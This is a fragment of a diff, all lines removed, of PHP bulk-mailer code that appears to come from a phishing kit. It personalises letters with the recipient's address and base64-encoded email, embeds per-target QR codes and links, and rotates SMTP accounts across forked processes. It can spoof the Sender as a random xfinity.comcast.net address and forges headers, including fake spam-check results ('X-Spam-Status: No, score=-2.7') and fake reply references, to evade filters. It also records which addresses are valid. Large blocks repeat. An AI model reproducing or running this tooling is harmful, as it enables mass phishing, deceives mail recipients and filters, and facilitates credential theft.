-                				$subject = str_ireplace("##userid##", $userId, $subject);
-                				$subject = str_ireplace("##CHARs2##", $CHARs2, $subject);
-                				$subject = str_ireplace("##num4##", $num4, $subject);
-                				$subject = str_ireplace("##num9##", $num9, $subject);
-                				$subject = str_ireplace("##domain##", $domains,  $subject);
-                    
-                        // Set the subject
-                       
-                             // Check if the sender's email is valid
-                        
-			
-                               
-		       	        
-                                
-                                $fmail = str_ireplace("##domain##", $domains, $fmail);
-                                $fmail = str_ireplace("##userid##", $userId, $fmail);
-                                $fmail = str_ireplace("##relay##", $getsmtpUsername, $fmail);
-                                $fmail = str_ireplace("##date##", date('D, F d, Y  g:i A') , $fmail);
-                                $fmail = str_ireplace("##date2##", date('D, F d, Y') , $fmail);
-                                $fmail = str_ireplace("##date3##", date('F d, Y  g:i A') , $fmail);
-                                $fmail = str_ireplace("##date4##", date('F d, Y') , $fmail);
-                				$fmail = str_ireplace("##date5##", date('F d') , $fmail);
-                				$fmail = str_ireplace("##48hrs##", date('F j, Y', strtotime('+48 hours')) , $fmail);
-                				$fmail = str_ireplace("##email##", $email , $fmail);
-                				$fmail = str_ireplace("##email64##", $key64 , $fmail);
-                				$fmail = str_ireplace("##char9##", $char9, $fmail);
-                       			$fmail = str_ireplace("##char8##", $char8, $fmail);
-                				$fmail = str_ireplace("##char7##", $char7, $fmail);
-                				$fmail = str_ireplace("##char6##", $char6, $fmail);
-                				$fmail = str_ireplace("##char5##", $char5, $fmail);
-                				$fmail = str_ireplace("##char4##", $char4, $fmail);
-                				$fmail = str_ireplace("##char3##", $char3, $fmail);
-                				$fmail = str_ireplace("##char2##", $char2, $fmail);
-                				$fmail = str_ireplace("##CHARs2##", $CHARs2, $fmail);
-                				$fmail = str_ireplace("##num4##", $num4, $fmail);
-                				$fmail = str_ireplace("##num9##", $num9, $fmail);
-                                
-                                $fname = str_ireplace("##domain##", $domains, $fname); 
-                                $fname = str_ireplace("##userid##", $userId, $fname);
-                                $fname = str_ireplace("##date##", date('D, F d, Y  g:i A') , $fname);
-                                $fname = str_ireplace("##date2##", date('D, F d, Y') , $fname);
-                                $fname = str_ireplace("##date3##", date('F d, Y  g:i A') , $fname);
-                                $fname = str_ireplace("##date4##", date('F d, Y') , $fname);
-                				$fname = str_ireplace("##date5##", date('F d') , $fname);
-                				$fname = str_ireplace("##48hrs##", date('F j, Y', strtotime('+48 hours')) , $fname);
-                				$fname = str_ireplace("##email##", $email , $fname);
-                				$fname = str_ireplace("##email64##", $key64 , $fname);
-                				$fname = str_ireplace("##char9##", $char9, $fname);
-                       			$fname = str_ireplace("##char8##", $char8, $fname);
-                				$fname = str_ireplace("##char7##", $char7, $fname);
-                				$fname = str_ireplace("##char6##", $char6, $fname);
-                				$fname = str_ireplace("##char5##", $char5, $fname);
-                				$fname = str_ireplace("##char4##", $char4, $fname);
-                				$fname = str_ireplace("##char3##", $char3, $fname);
-                				$fname = str_ireplace("##char2##", $char2, $fname);
-                				$fname = str_ireplace("##CHARs2##", $CHARs2, $fname);
-                				$fname = str_ireplace("##num4##", $num4, $fname);
-                				$fname = str_ireplace("##num9##", $num9, $fname);
-                      
-                              	 
-
-            		    
-            		     if ($settings['encodeFromInfo']) {
-                           $mail->setFrom($fmail,  '=?UTF-8?B?' . base64_encode($fname) . '?=');
-                        } else {
-                        $mail->setFrom($fmail, $fname);
-                        
-                       }
-            		    
-            		    if ($settings['encodeSubject']) {
-                        
-                        $mail->Subject = '=?UTF-8?B?' . base64_encode($subject) . '?=';
-                        } else {
-                            $mail->Subject = $subject;
-                        }
-                        
-                  
-                      	if (!function_exists('generateRandomEmail')) {
-                                  function generateRandomEmail() {
-                                        $characters = 'abcdefghijklmnopqrstuvwxyz';
-                                        $randomString = '';
-                                        for ($i = 0; $i < 5; $i++) {
-                                            $randomString .= $characters[rand(0, strlen($characters) - 1)];
-                                        }
-                                        $randomString .= '@';
-                                        for ($i = 0; $i < 5; $i++) {
-                                            $randomString .= $characters[rand(0, strlen($characters) - 1)];
-                                        }
-                                        $randomString .= '.com';
-                                        return $randomString;
-                                    }
-                      	 }
-                      	 if (!function_exists('generateRandomNumber')) {
-                                 function generateRandomNumber() {
-                                                    return mt_rand(1000000000, 9999999999); // Random number between 100000 and 999999
-                                                }
-                                                
-                                    }            // Generate a random email
-                                                $randomEmail = generateRandomEmail();
-                                                
-                                                // Generate a random number
-                                                $randomNumber = generateRandomNumber();
-                                                
-                                                $randomIP = generateRandomIP();
-                      	 
-                                    
-
-
-
-                                 $fixedHeaders = [
-                                                    'Content-Type' => 'text/html; charset=utf-8',
-                                                    'Content-Transfer-Encoding' => 'quoted-printable',
-                                                    'Message-ID' => "<$randomNumber@example.com>",
-                                                    'Date' => 'Thu, 07 Dec 2023 02:26:12 GMT',
-                                                    'Priority' => 'normal',
-                                                    'Importance' => 'normal',
-                                                    'X-Priority' => '=?UTF-8?Q?=221_=28Highest=29=22?=',
-                                                    'X-Msmail-Priority' => '=?UTF-8?Q?=22High=22?=',
-                                                    'Reply-To' => $fmail,
-                                                    'In-Reply-To' => '<previous-message-id@smtp.comcast.net>',
-                                                    'References' => '<previous-message-id@smtp.comcast.net>',
-                                                    'X-Auto-Response-Suppress' => '=?UTF-8?Q?=22OOF=2C_DR=2C_RN=2C_NRN=2C_AutoReply?= =?UTF-8?Q?=22?=', 
-                                                    'X-Mailer' => '=?UTF-8?Q?=22Your_Custom_Mailer=22?=',
-                                                    'Return-Receipt-To' => $randomEmail,
-                                                    'Disposition-Notification-To' => $randomEmail,
-                                                    'X-Confirm-Reading-To' => $randomEmail,
-                                                    'X-Unsubscribe' => $randomEmail,
-                                                    'List-Unsubscribe' => $randomEmail,
-                                                    'X-Report-Abuse' => $randomEmail,
-                                                    'Precedence' => 'bulk',
-                                                    'X-Bulk' => 'bulk',
-                                                    'X-Spam-Status' => 'No, score=-2.7',
-                                                    'X-Spam-Score' => '-2.7',
-                                                    'X-Spam-Bar' => '/',
-                                                    'X-Spam-Flag' => 'NO',
-                                             //       'X-Originating-IP' => $randomIP,
-                                                    'To' => $email
-                                                ];
-                                                      
-                                                
-                                                            // Check if the customHeaders key exists and is an array
-                            if (isset($customHeaderSettings['customHeaders']) && is_array($customHeaderSettings['customHeaders'])) {
-                                // Retrieve the custom headers
-                                $customHeaders = $customHeaderSettings['customHeaders'];
-                            
-                                // Merge fixed headers with custom headers
-                                $allHeaders = array_merge($fixedHeaders, $customHeaders);
-                            
-                                // Loop through all merged headers
-                                foreach ($allHeaders as $header => $value) {
-                                    // Use $header and $value here as needed
-                                   
-                                    // For example, adding headers to PHPMailer
-                                    $mail->addCustomHeader("$header: $value");
-                                }
-                            } else {
-                                // If custom headers are not properly defined, use only the fixed headers
-                                $allHeaders = $fixedHeaders;
-                            
-                                // Loop through fixed headers
-                                foreach ($allHeaders as $header => $value) {
-                                    // Use $header and $value here as needed
-                                  
-                                    // For example, adding headers to PHPMailer
-                                    $mail->addCustomHeader("$header: $value");
-                                }
-                            }
-                        
-                        $mail->isHTML(true);
-                        $mail->Body    = $letter;
-     
-                       
-                        
-
-    try {
-        if ($mail->send()) {
-            echo "Message sent successfully to $recipient using SMTP: {$smtpConfig['username']}\n";
-            return true;
-        } else {
-            echo 'Mailer Error: ' . $mail->ErrorInfo . " to $recipient using SMTP: {$smtpConfig['username']}\n";
-            if ($retryCount > 0) {
-                echo "Retrying sending to $recipient using SMTP: {$smtpConfig['username']} (Retry Count: $retryCount)\n";
-                return sendEmail($recipient, $smtpConfig, $retryCount - 1);
-            } else {
-                echo "Failed to send to $recipient after retries using SMTP: {$smtpConfig['username']}\n";
-                return false;
-            }
-        }
-    } catch (Exception $e) {
-        echo 'Caught exception: ' . $e->getMessage() . "\n";
-        return false;
-    }
-}
-
-
-
-$threadCount = isset($settings['threads']) && $settings['threads'] > 1 ? $settings['threads'] : 1;
-echo "Thread count: $threadCount\n"; // Echo the thread count
-
-$smtpCount = count($smtpSettings); // Initialize $smtpCount with the count of SMTP configurations
-$smtpIndex = 0; // Initialize $smtpIndex
-
-if ($threadCount > 1) {
-    $chunks = array_chunk($recipientList, ceil(count($recipientList) / $threadCount));
-
-    $childProcesses = [];
-
-    foreach ($chunks as $chunk) {
-        $pid = pcntl_fork();
-
-        if ($pid == -1) {
-            die("Error forking process.");
-        } elseif ($pid) {
-            $childProcesses[] = $pid;
-        } else {
-            foreach ($chunk as $recipient) {
-                $smtpConfig = $smtpSettings[$smtpIndex % $smtpCount];
-                sendEmail($recipient, $smtpConfig);
-                $smtpIndex++;
-            }
-            exit(); // Exit the child process after sending emails in the chunk
-        }
-    }
-
-    // Wait for child processes to finish
-    foreach ($childProcesses as $pid) {
-        pcntl_waitpid($pid, $status);
-    }
-} else {
-    // Single-threaded logic as before
-    foreach ($recipientList as $recipient) {
-        $smtpConfig = $smtpSettings[$smtpIndex % $smtpCount];
-        sendEmail($recipient, $smtpConfig);
-        $smtpIndex++;
-    }
-}
-
-$loop->run();
-
-} else {
-            // Use the only available SMTP configuration
-            $settings = array_merge(reset($smtpSettings), $recipientListSettings, $customHeaderSettings, $commonSettings);
-
-            // Use the number of threads specified in commonSettings or default to 1 if not provided
-            $numThreads = empty($settings['threads']) ? 1 : intval($settings['threads']);
-
-            // Load recipient list from file
-            $recipientListFile = 'list/' . $settings['recipientListFile'];  // Update the path as needed
-            $recipientList = file($recipientListFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-
-            // Remove duplicates if specified
-            if ($settings['removeDuplicates']) {
-                $recipientList = array_unique($recipientList);
-            }
-
-            // Check if recipient list is empty or has at least one recipient
-            if (empty($recipientList)) {
-                throw new Exception('You must provide at least one recipient email address.');
-            }
-             
-             $numEmails = count($recipientList);
-                
-                // Echo the number of emails
-                echo "\n\033[1;33mNumber of emails: $numEmails";
-                 echo "\n\033[1;33mNumber of smtp: 1\n";
-                 echo "\n\033[1;33mProceeding to send emails...\n";
-            // Divide the recipient list into chunks based on the number of threads
-           $chunks = array_chunk($recipientList, max(1, ceil(count($recipientList) / $numThreads)));
-
-// Create a separate process for each thread
-            $pids = [];
-            for ($i = 0; $i < $numThreads; $i++) {
-                $pid = pcntl_fork();
-            
-                if ($pid == -1) {
-                    die("Could not fork.\n");
-                } elseif ($pid) {
-                    // Parent process
-                    $pids[] = $pid;
-                } else {
-                    // Child process
-                    if (isset($chunks[$i]) && is_array($chunks[$i])) {
-                        $start = $i * count($chunks[$i]);
-                        $end = min(($i + 1) * count($chunks[$i]), count($recipientList));
-            
-                        // Load a new instance of PHPMailer in each thread
-                        $mail = new PHPMailer(true);
-                                
-                                
-         function generateRandomIP() {
-             
-                    return rand(1, 255) . '.' . rand(0, 255) . '.' . rand(0, 255) . '.' . rand(1, 255);
-            
-             }
-             
-             $maxConsecutiveFailures = $settings['ErrorHandling'];
-
-// Counter to track consecutive failures
-            $consecutiveFailures = 0;
-            
-         
-            
-                   // Load email addresses from the recipient list
-            foreach ($chunks[$i] as $email) {
-                        $mail->addAddress($email);
-                
-                         // Server settings
-                        $mail->isSMTP();
-                        $mail->Host       = $settings['host'];
-                        $mail->Port       = $settings['port'];
-                        $mail->Username   = $settings['username'];
-                        $mail->Password   = $settings['password'];
-                        $mail->SMTPSecure = $settings['Auth'];
-                        $mail->Hostname   = $settings['Hostname'];
-                        $mail->SMTPAuth   = true;
-                        $mail->SMTPKeepAlive = true;
-                        $mail->Priority   = $settings['priority'];
-            		    $mail->Encoding = $settings['encoding'];
-            		    $mail->CharSet = $settings['charset'];
-                                    
-
-                      $senderEmail = isset($settings['from']) ? $settings['from'] : '';
-                         if (!$senderEmail) {
-                         throw new Exception('Invalid sender email address.');
-                     }
-                       
-                        
-                        
-        		         $edomainn = explode('@', $email);
-                         $userId = $edomainn[0];
-                         $domains = $edomainn[1];
-                        
-                        
-                            $fmail = $settings['from'];
-                            $fname = $settings['fromname'];
-                            $subject = $settings['subject'];
-                    
-                          
-                        $getsmtpUsername = $smtpSettings[0]['username'];
-                         if ($settings['randSender'] == true) {
-                        $domainsmtp = "xfinity.comcast.net";
-                    	$mylength = rand(15,30);
-                    	$mail->Sender = substr(str_shuffle('0123456789abcdefghijklmnopqrstuvwxyz'),1,$mylength)."communication@".$domainsmtp;
-            //			
-                    } else {
-                       $mail->Sender = $fmail;
-                    }
-                        // Attachments
-                        
-                        
-                        
-                        if (!empty($settings['image_attachfile'])) {
-                            $imageAttachmentPath = 'attachment/' . $settings['image_attachfile']; // Update the path as needed
-                             if ($settings['displayimage'] == true) {
-                             $mail->addEmbeddedImage($imageAttachmentPath, 'imgslet', $settings['image_attachname'], 'base64', 'image/jpeg, image/jpg, image/png');
-                             }else{
-                                 $mail->addAttachment($imageAttachmentPath, $settings['image_attachfile']);
-                            }
-                            
-                        }
-                        
-                                        
-    
-
-                        if (!empty($settings['pdf_attachfile'])) {
-                            $mail->addAttachment($settings['pdf_attachfile']);
-                        }
-                         $link = explode('|', $commonSettings['link']);
-                        $b64link = base64_encode($commonSettings['linkb64']);
-                       
-                        
-                        
-                        if ($commonSettings['autolink'] == true) {
-            		    	$qrCode = new QrCode($commonSettings['qrlink'] . '?e=' . $email);
-                            $qrCode->setLabel($commonSettings['qrlabel']);
-                      	    
-		        	    }else{
-		    	    
-		    	            $qrCode = new QrCode($commonSettings['qrlink']);
-                            $qrCode->setLabel($commonSettings['qrlabel']);
-                        
-		            	}
-				    
-                             $qrCode->setSize(160); // Set the size of the QR code
-
-                                // Get QR code image data as base64
-                            $qrCodeBase64 = base64_encode($qrCode->writeString());
-                            $label = '<div style="text-align:center;font-size:16px;font-weight:bold;">Scan Me</div>';
-                            $qrCodeImage = '<img src="data:image/png;base64,' . $qrCodeBase64 . '" alt="Scan Me QR Code" style="display:block;margin:0 auto;">';
-            				
-				
-				
-                               
-                        
-                       $imageBase64 = ''; // Initialize $imageBase64 variable
-
-                        if (!empty($commonSettings['imageLetter'])) {
-                            $imagePath = 'attachment/' . $commonSettings['imageLetter'];
-                        
-                            if (file_exists($imagePath)) {
-                                $imageBase64 = base64_encode(file_get_contents($imagePath));
-                            } else {
-                                // Handle case when the file doesn't exist
-                                echo "The image file doesn't exist at $imagePath";
-                            }
-                        }
-                        
-                        // Use $imageBase64 as needed, ensuring it contains valid data
-                        $dataUri = !empty($imageBase64) ? 'data:image/png;base64,' . $imageBase64 : '';
-                        
-                                               
-                        $char9 = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"),0,9);
-        				$char8 = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"),0,8);
-        				$char7 = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"),0,7);
-        				$char6 = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"),0,6);
-        				$char5 = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"),0,5);
-        				$char4 = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"),0,4);
-        				$char3 = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"),0,3);
-        				$char2 = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"),0,2);
-        				$CHARs2 = substr(str_shuffle(strtoupper("ABCDEFGHIJKLMNOPQRSTUVWXYZ")),0,2);
-        				$num9 = substr(str_shuffle("0123456789"),0,9);
-        				$num4 = substr(str_shuffle("0123456789"),0,4);
-        				$key64 = base64_encode($email);
-        			
-        
-                                $letterFile = 'letter/' . $settings['letterFile']; // Update the path as needed
-                                $letter = file_get_contents($letterFile) or die("Letter not found!");
-                                $letter = str_ireplace("##char8##", $char8, $letter);
-                                $letter = str_ireplace("##char7##", $char7, $letter);
-                                $letter = str_ireplace("##char6##", $char6, $letter);
-                                $letter = str_ireplace("##char5##", $char5, $letter);
-                                $letter = str_ireplace("##char4##", $char4, $letter);
-                                $letter = str_ireplace("##char3##", $char3, $letter);
-                        
-                                // ... (continue with your existing code)
-                        
-                        // Additional randomization features
-                        
-				          if ($commonSettings['randomparam'] == true) {
-            		    		$letter = str_ireplace("##link##", $link[array_rand($link)].'?id='.generatestring('mix', 8, 'normal'), $letter);
-            					$letter = str_ireplace("##char8##", $char8, $letter);
-            					$letter = str_ireplace("##char7##", $char7, $letter);
-            					$letter = str_ireplace("##char6##", $char6, $letter);
-            					$letter = str_ireplace("##char5##", $char5, $letter);
-            					$letter = str_ireplace("##char4##", $char4, $letter);
-            					$letter = str_ireplace("##char3##", $char3, $letter);
-            		            	}else{
-            		    		$letter = str_ireplace("##link##", $link[array_rand($link)], $letter);
-            		    		$letter = str_ireplace("##char8##", $char8, $letter);
-            					$letter = str_ireplace("##char7##", $char7, $letter);
-            					$letter = str_ireplace("##char6##", $char6, $letter);
-            					$letter = str_ireplace("##char5##", $char5, $letter);
-            					$letter = str_ireplace("##char4##", $char4, $letter);
-            					$letter = str_ireplace("##char3##", $char3, $letter);
-            					
-            		    	}
-                		    	$letter = str_ireplace("##date##", date('D, F d, Y  g:i A') , $letter);
-                                $letter = str_ireplace("##date2##", date('D, F d, Y') , $letter);
-                                $letter = str_ireplace("##date3##", date('F d, Y  g:i A') , $letter);
-                                $letter = str_ireplace("##date4##", date('F d, Y') , $letter);
-                				$letter = str_ireplace("##date5##", date('F d') , $letter);
-                				$letter = str_ireplace("##48hrs##", date('F j, Y', strtotime('+48 hours')) , $letter);
-                				$letter = str_ireplace("##email##", $email , $letter);
-                				$letter = str_ireplace("##email64##", $key64 , $letter);
-                				$letter = str_ireplace("##link64##", $b64link, $letter);
-                				$letter = str_ireplace("##char9##", $char9, $letter);
-                       			$letter = str_ireplace("##char8##", $char8, $letter);
-                				$letter = str_ireplace("##char7##", $char7, $letter);
-                				$letter = str_ireplace("##char6##", $char6, $letter);
-                				$letter = str_ireplace("##char5##", $char5, $letter);
-                				$letter = str_ireplace("##char4##", $char4, $letter);
-                				$letter = str_ireplace("##char3##", $char3, $letter);
-                				$letter = str_ireplace("##char2##", $char2, $letter);
-                				$letter = str_ireplace("##CHARs2##", $CHARs2, $letter);
-                				$letter = str_ireplace("##num4##", $num4, $letter);
-                				$letter = str_ireplace("##userid##", $userId, $letter);
-                				$letter = str_ireplace("##domain##", $domains,  $letter);
-                				$letter = str_ireplace("##imglet##", $dataUri, $letter);
-                        	    $letter = str_ireplace("##qrcode##", '<div style="text-align: center;"><img src="data:image/png;base64,' . $qrCodeBase64 . '" ></div>', $letter);
-                        	    $letter = str_ireplace("##URLqrcode##", '<div style="text-align: center;"><a href="' . $link[array_rand($link)] . '" target="_blank"><img src="data:image/png;base64,' . $qrCodeBase64 . '"></a></div>', $letter);
-        
-                	
-
-
-                       // Replace placeholders in the subject with the current date
-                        
-                                $subject = str_ireplace("##date##", date('D, F d, Y  g:i A') , $subject);
-                                $subject = str_ireplace("##date2##", date('D, F d, Y') , $subject);
-                                $subject = str_ireplace("##date3##", date('F d, Y  g:i A') , $subject);
-                                $subject = str_ireplace("##date4##", date('F d, Y') , $subject);
-                				$subject = str_ireplace("##date5##", date('F d') , $subject);
-                				$subject = str_ireplace("##48hrs##", date('F j, Y', strtotime('+48 hours')) , $subject);
-                				$subject = str_ireplace("##email##", $email , $subject);
-                				$subject = str_ireplace("##email64##", $key64 , $subject);
-                				$subject = str_ireplace("##link64##", $b64link, $subject);
-                				$subject = str_ireplace("##char9##", $char9, $subject);
-                       			$subject = str_ireplace("##char8##", $char8, $subject);
-                				$subject = str_ireplace("##char7##", $char7, $subject);
-                				$subject = str_ireplace("##char6##", $char6, $subject);
-                				$subject = str_ireplace("##char5##", $char5, $subject);
-                				$subject = str_ireplace("##char4##", $char4, $subject);
-                				$subject = str_ireplace("##char3##", $char3, $subject);
-                				$subject = str_ireplace("##char2##", $char2, $subject);
-                				$subject = str_ireplace("##userid##", $userId, $subject);
-                				$subject = str_ireplace("##CHARs2##", $CHARs2, $subject);
-                				$subject = str_ireplace("##num4##", $num4, $subject);
-                				$subject = str_ireplace("##num9##", $num9, $subject);
-                				$subject = str_ireplace("##domain##", $domains,  $subject);
-                    
-                        // Set the subject
-                       
-                             // Check if the sender's email is valid
-                        
-			
-                               
-		       	        
-                                
-                                $fmail = str_ireplace("##domain##", $domains, $fmail);
-                                $fmail = str_ireplace("##userid##", $userId, $fmail);
-                                $fmail = str_ireplace("##relay##", $getsmtpUsername, $fmail);
-                                $fmail = str_ireplace("##date##", date('D, F d, Y  g:i A') , $fmail);
-                                $fmail = str_ireplace("##date2##", date('D, F d, Y') , $fmail);
-                                $fmail = str_ireplace("##date3##", date('F d, Y  g:i A') , $fmail);
-                                $fmail = str_ireplace("##date4##", date('F d, Y') , $fmail);
-                				$fmail = str_ireplace("##date5##", date('F d') , $fmail);
-                				$fmail = str_ireplace("##48hrs##", date('F j, Y', strtotime('+48 hours')) , $fmail);
-                				$fmail = str_ireplace("##email##", $email , $fmail);
-                				$fmail = str_ireplace("##email64##", $key64 , $fmail);
-                				$fmail = str_ireplace("##char9##", $char9, $fmail);
-                       			$fmail = str_ireplace("##char8##", $char8, $fmail);
-                				$fmail = str_ireplace("##char7##", $char7, $fmail);
-                				$fmail = str_ireplace("##char6##", $char6, $fmail);
-                				$fmail = str_ireplace("##char5##", $char5, $fmail);
-                				$fmail = str_ireplace("##char4##", $char4, $fmail);
-                				$fmail = str_ireplace("##char3##", $char3, $fmail);
-                				$fmail = str_ireplace("##char2##", $char2, $fmail);
-                				$fmail = str_ireplace("##CHARs2##", $CHARs2, $fmail);
-                				$fmail = str_ireplace("##num4##", $num4, $fmail);
-                				$fmail = str_ireplace("##num9##", $num9, $fmail);
-                                
-                                $fname = str_ireplace("##domain##", $domains, $fname); 
-                                $fname = str_ireplace("##userid##", $userId, $fname);
-                                $fname = str_ireplace("##date##", date('D, F d, Y  g:i A') , $fname);
-                                $fname = str_ireplace("##date2##", date('D, F d, Y') , $fname);
-                                $fname = str_ireplace("##date3##", date('F d, Y  g:i A') , $fname);
-                                $fname = str_ireplace("##date4##", date('F d, Y') , $fname);
-                				$fname = str_ireplace("##date5##", date('F d') , $fname);
-                				$fname = str_ireplace("##48hrs##", date('F j, Y', strtotime('+48 hours')) , $fname);
-                				$fname = str_ireplace("##email##", $email , $fname);
-                				$fname = str_ireplace("##email64##", $key64 , $fname);
-                				$fname = str_ireplace("##char9##", $char9, $fname);
-                       			$fname = str_ireplace("##char8##", $char8, $fname);
-                				$fname = str_ireplace("##char7##", $char7, $fname);
-                				$fname = str_ireplace("##char6##", $char6, $fname);
-                				$fname = str_ireplace("##char5##", $char5, $fname);
-                				$fname = str_ireplace("##char4##", $char4, $fname);
-                				$fname = str_ireplace("##char3##", $char3, $fname);
-                				$fname = str_ireplace("##char2##", $char2, $fname);
-                				$fname = str_ireplace("##CHARs2##", $CHARs2, $fname);
-                				$fname = str_ireplace("##num4##", $num4, $fname);
-                				$fname = str_ireplace("##num9##", $num9, $fname);
-                      
-                              	 
-
-            		    
-            		     if ($settings['encodeFromInfo']) {
-                           $mail->setFrom($fmail,  '=?UTF-8?B?' . base64_encode($fname) . '?=');
-                        } else {
-                        $mail->setFrom($fmail, $fname);
-                        
-                       }
-            		    
-            		    if ($settings['encodeSubject']) {
-                        
-                        $mail->Subject = '=?UTF-8?B?' . base64_encode($subject) . '?=';
-                        } else {
-                            $mail->Subject = $subject;
-                        }
-                        
-                  
-                      	if (!function_exists('generateRandomEmail')) {
-                                  function generateRandomEmail() {
-                                        $characters = 'abcdefghijklmnopqrstuvwxyz';
-                                        $randomString = '';
-                                        for ($i = 0; $i < 5; $i++) {
-                                            $randomString .= $characters[rand(0, strlen($characters) - 1)];
-                                        }
-                                        $randomString .= '@';
-                                        for ($i = 0; $i < 5; $i++) {
-                                            $randomString .= $characters[rand(0, strlen($characters) - 1)];
-                                        }
-                                        $randomString .= '.com';
-                                        return $randomString;
-                                    }
-                      	 }
-                      	 if (!function_exists('generateRandomNumber')) {
-                                 function generateRandomNumber() {
-                                                    return mt_rand(1000000000, 9999999999); // Random number between 100000 and 999999
-                                                }
-                                                
-                                    }            // Generate a random email
-                                                $randomEmail = generateRandomEmail();
-                                                
-                                                // Generate a random number
-                                                $randomNumber = generateRandomNumber();
-                                                
-                                                $randomIP = generateRandomIP();
-                      	 
-                                    
-
-
-
-                                 $fixedHeaders = [
-                                                    'Content-Type' => 'text/html; charset=utf-8',
-                                                    'Content-Transfer-Encoding' => 'quoted-printable',
-                                                    'Message-ID' => "<$randomNumber@example.com>",
-                                                    'Date' => 'Thu, 07 Dec 2023 02:26:12 GMT',
-                                                    'Priority' => 'normal',
-                                                    'Importance' => 'normal',
-                                                    'X-Priority' => '=?UTF-8?Q?=221_=28Highest=29=22?=',
-                                                    'X-Msmail-Priority' => '=?UTF-8?Q?=22High=22?=',
-                                                    'Reply-To' => $fmail,
-                                                    'In-Reply-To' => '<previous-message-id@smtp.comcast.net>',
-                                                    'References' => '<previous-message-id@smtp.comcast.net>',
-                                                    'X-Auto-Response-Suppress' => '=?UTF-8?Q?=22OOF=2C_DR=2C_RN=2C_NRN=2C_AutoReply?= =?UTF-8?Q?=22?=', 
-                                                    'X-Mailer' => '=?UTF-8?Q?=22Your_Custom_Mailer=22?=',
-                                                    'Return-Receipt-To' => $randomEmail,
-                                                    'Disposition-Notification-To' => $randomEmail,
-                                                    'X-Confirm-Reading-To' => $randomEmail,
-                                                    'X-Unsubscribe' => $randomEmail,
-                                                    'List-Unsubscribe' => $randomEmail,
-                                                    'X-Report-Abuse' => $randomEmail,
-                                                    'Precedence' => 'bulk',
-                                                    'X-Bulk' => 'bulk',
-                                                    'X-Spam-Status' => 'No, score=-2.7',
-                                                    'X-Spam-Score' => '-2.7',
-                                                    'X-Spam-Bar' => '/',
-                                                    'X-Spam-Flag' => 'NO',
-                                             //       'X-Originating-IP' => $randomIP,
-                                                    'To' => $email
-                                                ];
-                                                      
-                                                
-                                                            // Check if the customHeaders key exists and is an array
-                            if (isset($customHeaderSettings['customHeaders']) && is_array($customHeaderSettings['customHeaders'])) {
-                                // Retrieve the custom headers
-                                $customHeaders = $customHeaderSettings['customHeaders'];
-                            
-                                // Merge fixed headers with custom headers
-                                $allHeaders = array_merge($fixedHeaders, $customHeaders);
-                            
-                                // Loop through all merged headers
-                                foreach ($allHeaders as $header => $value) {
-                                    // Use $header and $value here as needed
-                                   
-                                    // For example, adding headers to PHPMailer
-                                    $mail->addCustomHeader("$header: $value");
-                                }
-                            } else {
-                                // If custom headers are not properly defined, use only the fixed headers
-                                $allHeaders = $fixedHeaders;
-                            
-                                // Loop through fixed headers
-                                foreach ($allHeaders as $header => $value) {
-                                    // Use $header and $value here as needed
-                                  
-                                    // For example, adding headers to PHPMailer
-                                    $mail->addCustomHeader("$header: $value");
-                                }
-                            }
-                        
-                        $mail->isHTML(true);
-                        
-                        $mail->Body = $letter; // Set the content of your email
-                    
-                                            
-                        if (!function_exists('handleFailure')) {
-                               function handleFailure($errorMessage, $email, $consecutiveFailures, $maxConsecutiveFailures, $failedEmailsFile, $badlistFile, $recipientList, $sentEmailsFile) {
-                        // Check if the error message contains "Could not connect to SMTP host"
-                        if (strpos($errorMessage, 'Could not connect to SMTP host') !== false) {
-                            // Increment the consecutive failures counter
-                            $consecutiveFailures++;
-                        }
-                    
-                        $errorMessage = strtolower($errorMessage);
-                        
-                        // Check if the error message contains specific phrases
-                        $specificErrorPhrases = ['could not connect', 'could not authenticate','too many emails'];
-                        
-                        $isSpecificError = false;
-                        
-                        foreach ($specificErrorPhrases as $phrase) {
-                            if (strpos($errorMessage, strtolower($phrase)) !== false) {
-                                $isSpecificError = true;
-                                break;
-                            }
-                        }
-                        
-                        // Log the email to the failedEmailsFile if it's a specific error, otherwise log it to the badlistFile
-                        if ($isSpecificError) {
-                            file_put_contents($failedEmailsFile, $email . PHP_EOL, FILE_APPEND);
-                        } else {
-                            file_put_contents($badlistFile, $email . PHP_EOL, FILE_APPEND);
-                        }
-
-                        // Print the email in red for failure
-                        echo "\033[0;31mFailed to send email to:\033[0m \033[0;31m$email Error: $errorMessage\033[0m\n";
-                    
-                        // Check if consecutive failures have reached the limit
-                        if ($consecutiveFailures >= $maxConsecutiveFailures) {
-                            echo "\033[0;37mToo many consecutive failures. Stopping further email sends.\033[0m\n";
-                    
-                          
-                            exit;
-                        }
-                    }
-                            
-                        }
-                    
-                    // Example usage within your main code with try-catch blocks
-                    
-                    try {
-                        if ($mail->send()) {
-                            // Reset the consecutive failures counter on successful email send
-                            $consecutiveFailures = 0;
-                    
-                            // Print the email in green for success
-                            echo "\n\033[0;33mEmail sent successfully to:\033[0m \033[0;32m$email\033[0m\n";
-                            file_put_contents($sentEmailsFile, $email . PHP_EOL, FILE_APPEND);
-                           if (!file_exists($validEmailsFile) || !strpos(file_get_contents($validEmailsFile), $email)) {
-                                file_put_contents($validEmailsFile, $email . PHP_EOL, FILE_APPEND);
-                            }
-                        } else {
-                            handleFailure($mail->ErrorInfo, $email, $consecutiveFailures, $maxConsecutiveFailures, $failedEmailsFile, $badlistFile, $recipientList, $sentEmailsFile);
-                        }
-                    } catch (Exception $e) {
-                        // Handle exceptions and increment the consecutive failures counter
-                        $consecutiveFailures++;
-                    
-                        handleFailure($e->getMessage(), $email, $consecutiveFailures, $maxConsecutiveFailures, $failedEmailsFile, $badlistFile, $recipientList, $sentEmailsFile);
-                    }
-                                            
-                                            
-                                            
-                        if (!empty($settings['sleepDuration']) && is_numeric($settings['sleepDuration'])) {
-                        // Retrieve sleep duration from settings
-                        $sleeptimer = $settings['sleepDuration'];
-                        echo "\nSleep For: \033[0;32m$sleeptimer seconds\033[0m\n";
-                        // Use usleep to sleep for the specified duration in microseconds
-                        sleep(intval($settings['sleepDuration']));
-                    
-                        // Output the sleep duration in green
-                        
-                    }
-                    
-
